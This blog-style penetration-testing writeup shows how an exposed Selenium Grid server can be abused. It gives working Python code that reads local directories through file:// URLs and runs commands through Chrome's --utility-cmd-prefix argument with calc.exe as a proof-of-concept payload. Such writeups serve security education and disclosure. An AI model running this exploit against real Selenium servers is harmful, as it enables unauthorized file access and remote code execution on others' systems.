---
layout: post
title: "Selenium Local File Inclusion to Remote Code Execution"
date: 2021-07-20 15:02:00 -0500
categories: misc
tags: windows selenium rce
image:
  path: /assets/img/headers/selenium/selenium.png
---

## Selenium Local File Inclusion Exploit

Welcome to everybody [@T3jv1l](https://twitter.com/T3jv1l) here, and today I'll talk shortly about selenium. I'll walk you through a scenario I came across while conducting a penetration test and demonstrate how I obtained Local File Inclusion (LFI) and Remote Code Execution (RCE) in Selenium Grid.

Create a lab setting. From [https://www.java.com/download/ie_manual.jsp](https://www.java.com/download/ie_manual.jsp), install Java. [https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar](https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar) is the URL to get the most recent version of Selenium Grid. Download your browser's webdrive version. If you are unsure of your version, download any version, and then reinstall it after receiving the error message stating you do not have version X installed [https://chromedriver.chromium.org/downloads](https://chromedriver.chromium.org/downloads).

Start Selenium server:
```sh
java -Dwebdriver.chrome.driver="C:\Selenium\chromedriver.exe" -jar  C:\Users\nutcrackers\Downloads\selenium-server-standalone-3.141.59.jar
```

![selenium](/assets/img/headers/selenium/selenium2.png)

Everything is all set up. Let's begin. We will first use Python to set up our webdriver. All of the WebDriver implementations are offered by the `selenium.webdriver` module. Firefox, Chrome, and other browsers that use WebDriver are currently supported. We'll use the following to build the remote Chrome and Firefox instances:
```python
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

# load webdrive module from chrome instance/session

driver = webdriver.Remote(
   command_executor='http://192.168.1.130:4444/wd/hub',
   desired_capabilities=DesiredCapabilities.CHROME,

)
driver.get("file:///C:/Users/nutcrackers") # display internal information
print(driver.page_source)
driver.quit()
```

- `webdriver.Remote()`: Create a new instance of the WebDriver by calling webdriver.Remote() constructor. This allows communication with a remote Selenium server.

- `command_executor='http://192.168.1.130:4444/wd/hub'`: Specify the URL of the Selenium server to connect to. The provided URL is http://192.168.1.130:4444/wd/hub.

- `desired_capabilities=DesiredCapabilities.CHROME`: Set the desired capabilities for the WebDriver. In this case, it uses the Chrome browser.

- `driver.get("file:///C:/Users/nutcrackers")`: Open the specified URL in the browser. In this case, it opens a local file C:/Users/nutcrackers.

- `print(driver.page_source)`: Retrieve the page source of the loaded web page and print it to the console.

- `driver.quit()`: Close the browser and terminate the WebDriver session.

Overall, this code sets up a WebDriver instance to connect to a remote Selenium server, opens a local file in the browser, retrieves the page source, and then closes the browser.

![selenium](/assets/img/headers/selenium/selenium3.png)

You can view the entire contents of the server's `C:/Users/nutcrackers` directory if you open the index.html file locally.

![selenium](/assets/img/headers/selenium/selenium4.png)

## Selenium Remote Code Execution Exploit

The next tactic is remote code execution (RCE). The arguments from the browser must be used to launch powershell.exe or, in this case, a calc.exe. Due to the browser driver being connected to the server, this is quite easy to do.
```python
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

payload='calc.exe #' #payload just for POC
# execute chrome arguments
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--utility-and-browser")
chrome_options.add_argument("--utility-cmd-prefix="+payload)

driver = webdriver.Remote(
   command_executor='http://192.168.1.130:4444/wd/hub',
   desired_capabilities=DesiredCapabilities.CHROME,
   options=chrome_options
)
driver.get("https://google.com")
driver.quit()
```
We set the payload:

- `payload='calc.exe #'`: Define the payload to be executed. In this case, the payload is 'calc.exe #'. This payload is for Proof of Concept (POC) purposes.

- `chrome_options = webdriver.ChromeOptions()`: Create an instance of ChromeOptions to configure the Chrome browser.

- `chrome_options.add_argument("--no-sandbox")`: Add the `--no-sandbox` argument to the Chrome options. This argument disables the sandbox mode in Chrome.
    
- `chrome_options.add_argument("--utility-and-browser")`: Add the `--utility-and-browser` argument to the Chrome options. This argument enables both utility and browser processes in Chrome.

- `chrome_options.add_argument("--utility-cmd-prefix="+payload)`: Add the `--utility-cmd-prefix` argument to the Chrome options and set it to the previously defined payload. This argument specifies the command prefix for utility processes in Chrome.

![selenium](/assets/img/headers/selenium/selenium5.png)

## Reference

[https://selenium-python.readthedocs.io/getting-started.html#simple-usage](https://selenium-python.readthedocs.io/getting-started.html#simple-usage)

[https://chromedriver.chromium.org/downloads](https://chromedriver.chromium.org/downloads)